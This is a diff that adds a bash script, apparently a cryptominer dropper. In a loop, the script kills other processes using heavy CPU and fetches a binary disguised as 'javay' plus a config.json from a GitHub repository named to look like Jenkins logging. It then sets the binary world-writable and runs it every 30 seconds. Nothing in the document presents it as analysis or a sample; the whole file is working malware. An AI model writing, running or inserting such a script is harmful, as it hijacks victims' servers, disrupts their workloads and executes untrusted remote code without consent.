@@ -1,0 +1,28 @@
+#!/bin/bash
+function run(){
+    ps aux | grep -v grep | grep -v "java\|redis\|weblogic\|mongod\|mysql\|oracle\|tomcat\|grep\|postgres\|confluence\|awk\|aux\|sh" | awk '{if($3>50.0) print $2}' | xargs -I % kill -9 %
+    if pgrep -f "javay" > /dev/null; then
+        sleep 30; run
+    else
+        if [ -f "javay" ]; then
+            chmod 777 javay
+            chmod +x javay
+        else
+            if command -v curl > /dev/null; then
+                curl -s -o javay https://github.com/supportmrx/jenkins-systemlogd2/raw/refs/heads/main/javay
+                curl -s -o config.json https://raw.githubusercontent.com/supportmrx/jenkins-systemlogd2/refs/heads/main/config.json
+            elif command -v wget > /dev/null; then
+                wget -q -O javay https://github.com/supportmrx/jenkins-systemlogd2/raw/refs/heads/main/javay
+                wget -q -O config.json https://raw.githubusercontent.com/supportmrx/jenkins-systemlogd2/refs/heads/main/config.json
+            else
+                exit 1
+            fi
+            chmod 777 javay
+            chmod +x javay
+        fi
+    fi
+    ./javay
+    sleep 30; run
+}
+
+run
